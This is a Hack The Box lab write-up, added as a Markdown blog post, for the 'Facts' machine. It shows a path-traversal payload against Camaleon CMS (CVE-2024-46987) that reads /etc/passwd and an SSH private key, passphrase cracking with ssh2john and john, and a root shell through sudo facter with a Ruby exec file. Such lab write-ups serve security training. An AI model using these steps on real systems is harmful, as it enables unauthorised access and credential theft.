@@ -1,0 +1,316 @@
+---
+title: HTB - Facts (easy)
+date: '2026-02-06'
+tags: ['machine', 'linux', 'LFI', 'path-traversal', 'camaleon-cms', 'ssh2john', 'facter']
+draft: false
+summary: Discovered a running webpage that allowed for registration. After logging in, it was revealed an outdated version of Camaleon CMS instance which was vulnerable to CVE-2024-46987 (Authenticated Arbitrary File Read). Leveraging that vulnerability to grab SSH keys on getting initial access. Finally, gained root access by exploiting a sudo misconfiguration using the facter command/binary.
+---
+
+![Description](/static/images/htb/linux/facts/facts.png)
+
+<TOCInline toc={props.toc} asDisclosure />
+
+
+## Scanning
+
+```bash
+❯ nmap -sV -sC -p- --min-rate=10000 10.129.10.99
+
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-02-05 17:19 UTC
+Nmap scan report for facts.htb (10.129.10.99)
+Host is up (0.043s latency).
+Not shown: 65532 closed tcp ports (conn-refused)
+PORT      STATE SERVICE VERSION
+22/tcp    open  ssh     OpenSSH 9.9p1 Ubuntu 3ubuntu3.2 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   256 4d:d7:b2:8c:d4:df:57:9c:a4:2f:df:c6:e3:01:29:89 (ECDSA)
+|_  256 a3:ad:6b:2f:4a:bf:6f:48:ac:81:b9:45:3f:de:fb:87 (ED25519)
+80/tcp    open  http    nginx 1.26.3 (Ubuntu)
+|_http-title: facts
+|_http-server-header: nginx/1.26.3 (Ubuntu)
+54321/tcp open  unknown
+| fingerprint-strings: 
+|   GenericLines, Help, Kerberos, RTSPRequest, SSLSessionReq, TLSSessionReq, TerminalServerCookie: 
+|     HTTP/1.1 400 Bad Request
+|     Content-Type: text/plain; charset=utf-8
+|     Connection: close
+|     Request
+|   GetRequest: 
+|     HTTP/1.0 400 Bad Request
+|     Accept-Ranges: bytes
+|     Content-Length: 276
+|     Content-Type: application/xml
+|     Server: MinIO
+|     Strict-Transport-Security: max-age=31536000; includeSubDomains
+|     Vary: Origin
+|     X-Amz-Id-2: dd9025bab4ad464b049177c95eb6ebf374d3b3fd1af9251148b658df7ac2e3e8
+|     X-Amz-Request-Id: 18916964D6BC913F
+|     X-Content-Type-Options: nosniff
+|     X-Xss-Protection: 1; mode=block
+|     Date: Thu, 05 Feb 2026 17:20:10 GMT
+|     <?xml version="1.0" encoding="UTF-8"?>
+|     <Error><Code>InvalidRequest</Code><Message>Invalid Request (invalid argument)</Message><Resource>/</Resource><RequestId>18916964D6BC913F</RequestId><HostId>dd9025bab4ad464b049177c95eb6ebf374d3b3fd1af9251148b658df7ac2e3e8</HostId></Error>
+|   HTTPOptions: 
+|     HTTP/1.0 200 OK
+|     Vary: Origin
+|     Date: Thu, 05 Feb 2026 17:20:10 GMT
+|_    Content-Length: 0
+1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
+SF-Port54321-TCP:V=7.94SVN%I=7%D=2/5%Time=6984D14A%P=x86_64-pc-linux-gnu%r
+SF:(GenericLines,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x
+SF:20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Ba
+SF:d\x20Request")%r(GetRequest,2B0,"HTTP/1\.0\x20400\x20Bad\x20Request\r\n
+SF:Accept-Ranges:\x20bytes\r\nContent-Length:\x20276\r\nContent-Type:\x20a
+SF:pplication/xml\r\nServer:\x20MinIO\r\nStrict-Transport-Security:\x20max
+SF:-age=31536000;\x20includeSubDomains\r\nVary:\x20Origin\r\nX-Amz-Id-2:\x
+SF:20dd9025bab4ad464b049177c95eb6ebf374d3b3fd1af9251148b658df7ac2e3e8\r\nX
+SF:-Amz-Request-Id:\x2018916964D6BC913F\r\nX-Content-Type-Options:\x20nosn
+SF:iff\r\nX-Xss-Protection:\x201;\x20mode=block\r\nDate:\x20Thu,\x2005\x20
+SF:Feb\x202026\x2017:20:10\x20GMT\r\n\r\n<\?xml\x20version=\"1\.0\"\x20enc
+SF:oding=\"UTF-8\"\?>\n<Error><Code>InvalidRequest</Code><Message>Invalid\
+SF:x20Request\x20\(invalid\x20argument\)</Message><Resource>/</Resource><R
+SF:equestId>18916964D6BC913F</RequestId><HostId>dd9025bab4ad464b049177c95e
+SF:b6ebf374d3b3fd1af9251148b658df7ac2e3e8</HostId></Error>")%r(HTTPOptions
+SF:,59,"HTTP/1\.0\x20200\x20OK\r\nVary:\x20Origin\r\nDate:\x20Thu,\x2005\x
+SF:20Feb\x202026\x2017:20:10\x20GMT\r\nContent-Length:\x200\r\n\r\n")%r(RT
+SF:SPRequest,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20te
+SF:xt/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x2
+SF:0Request")%r(Help,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Typ
+SF:e:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x
+SF:20Bad\x20Request")%r(SSLSessionReq,67,"HTTP/1\.1\x20400\x20Bad\x20Reque
+SF:st\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20c
+SF:lose\r\n\r\n400\x20Bad\x20Request")%r(TerminalServerCookie,67,"HTTP/1\.
+SF:1\x20400\x20Bad\x20Request\r\nContent-Type:\x20text/plain;\x20charset=u
+SF:tf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20Request")%r(TLSSessio
+SF:nReq,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20text/pl
+SF:ain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20Requ
+SF:est")%r(Kerberos,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type
+SF::\x20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x2
+SF:0Bad\x20Request");
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 100.37 seconds
+```
+
+
+Let's add `facts.htb` to our hosts file. A webserver on port 80 and what seems to be an API on port 54321 are running, let's check the webserver out
+
+
+![Description](/static/images/htb/linux/facts/1.png)
+
+
+Looking around, nothing seems to stand out. Let us proceed to fuzz directories
+
+
+
+## Enumeration
+
+
+```bash
+feroxbuster -u http://facts.htb -w /usr/share/wordlists/Seclist/Discovery/Web-Content/common.txt -W 371
+```
+
+![Description](/static/images/htb/linux/facts/2.png)
+
+
+There seems to be a `302` redirect to a login page. Let's check that out
+
+
+![Description](/static/images/htb/linux/facts/3.png)
+
+
+Seems like we can also register a new account, let us proceed with creating a dummy account
+
+
+
+![Description](/static/images/htb/linux/facts/4.png)
+
+![Description](/static/images/htb/linux/facts/5.png)
+
+After proceeding to login, we are greeted witht the admin dashboard. Observe at the bottom part of the dashboard reveals the CMS that is being used which is
+Camaleon CMS and the version which is 2.9.0
+
+![Description](/static/images/htb/linux/facts/6.png)
+
+
+## Looking for Public Exploits
+
+
+### Vulnerability Analysis
+
+A google search will reveal this advisory highlighting the current version is vulnerable to arbitrary path traversal which allows local file read on the target dubbed, CVE-2024-46987
+
+
+https://github.com/owen2345/camaleon-cms/security/advisories/GHSA-cp65-5m9r-vc2c
+
+![Description](/static/images/htb/linux/facts/7.png)
+
+
+1. From the `download_private_file` method, it allows authenticated users to download any file on the web server. In the 4'th line, the `file` parameter is passd to the `fetch_file` method
+
+```ruby
+def download_private_file
+  cama_uploader.enable_private_mode!
+
+  file = cama_uploader.fetch_file("private/#{params[:file]}")
+
+  send_file file, disposition: 'inline'
+end
+```
+
+2. The snippet code below from the `fetch_file` method only checks if the file exists and does not perform proper sanitization
+of file traversal attempts
+
+
+3. If the file exists it's passed back to the `download_private_file` method where the file is sent to the user via `send_file`
+
+
+```ruby
+def fetch_file(file_name)
+  raise ActionController::RoutingError, 'File not found' unless file_exists?(file_name)
+
+  file_name
+end
+```
+
+
+4. We can abuse this by performing path traversal attempts from the `download_private_file` method with the `file` parameter
+
+
+
+```url
+https:///admin/media/download_private_file?file=../../../../../../etc/passwd
+```
+
+
+### Local File Read
+
+
+![Description](/static/images/htb/linux/facts/8.png)
+
+
+We noticed there are two `1000`'s UIDs belonging to `trivia` and `william` which indicates user accounts on the target. We can attempt to read their SSH private keys, 
+the usual path and filename would be:
+
+```bash
+/home/<USER>/.ssh/id_rsa
+```
+
+but that would not resolve in any files being revealed, indicating the file doesn't exist.
+
+![Description](/static/images/htb/linux/facts/9.png)
+
+According to this [discussion](https://askubuntu.com/questions/30788/does-ssh-key-need-to-be-named-id-rsa), there are other filenames we could try:
+
+
+- `id_rsa`
+- `id_ecdsa`
+- `id_ecdsa_sk`
+- `id_ed25519`
+- `id_ed25519_sk`
+- `id_dsa`
+
+Eventually, we will discover that `id_ed25519` works in grabbing user `trivia` SSH private key
+
+
+![Description](/static/images/htb/linux/facts/10.png)
+
+
+## Cracking SSH Protected Key & Gaining Access
+
+Save the private key in a file and give it appropriate permissions
+
+```bash
+chmod 600 trivia_idrsa
+```
+
+Attempting to SSH onto the target using the private key as authentication will show a prompt requiring a password. This suggests
+that the private key is protected by a passphrase
+
+
+![Description](/static/images/htb/linux/facts/11.png)
+
+
+We can use `ssh2john` to convert the key into a "john hash". Save the converted hash in a file
+
+```bash
+ssh2john trivia_idrsa > sshjohn.txt
+```
+
+Then use `john` to crack the it
+
+```bash
+john sshjohn.txt --wordlist=/usr/share/wordlists/rockyou.txt --show
+```
+
+As I have already cracked it previously I will use this command instead
+
+![Description](/static/images/htb/linux/facts/12.png)
+
+
+Now, attempt to SSH into `trivia`
+
+```bash
+ssh -i trivia_idrsa trivia@facts.htb
+```
+
+![Description](/static/images/htb/linux/facts/13.png)
+
+
+## Privilege Escalation
+
+The user flag is nowhere to be found in the home directory, but it was discovered we can read files in `william` home directory and discover the user flag
+
+![Description](/static/images/htb/linux/facts/14.png)
+
+![Description](/static/images/htb/linux/facts/15.png)
+
+
+
+
+### Sudo misconfiguration
+
+```bash
+sudo -l
+```
+
+We can run the `facter` command with `sudo` privileges
+
+![Description](/static/images/htb/linux/facts/16.png)
+
+
+Looking at GTFObins, we discover that `facter` can be used to escalate our privileges
+
+![Description](/static/images/htb/linux/facts/17.png)
+
+
+The `facter` command will execute the first ruby file in the custom directory that we specify. So, if we can put a 
+ruby script in that said directory, it should execute that script as `root`
+
+I will use this one liner and save it to a ruby file called `shell.rb` in the home directory
+
+```ruby
+exec "/bin/bash"
+```
+
+Then run the `facter` command with `sudo`. The 'x' can be anything as it is meant to name the facts
+
+```bash
+sudo facter --custom-dir=/home/trivia/ x
+```
+
+![Description](/static/images/htb/linux/facts/18.png)
+
+Grab the root flag. EZPZ
+
+![Description](/static/images/htb/linux/facts/19.png)
+
+
+
+---
+
+## Sources
+
+- https://askubuntu.com/questions/30788/does-ssh-key-need-to-be-named-id-rsa
+- https://github.com/owen2345/camaleon-cms/security/advisories/GHSA-cp65-5m9r-vc2c
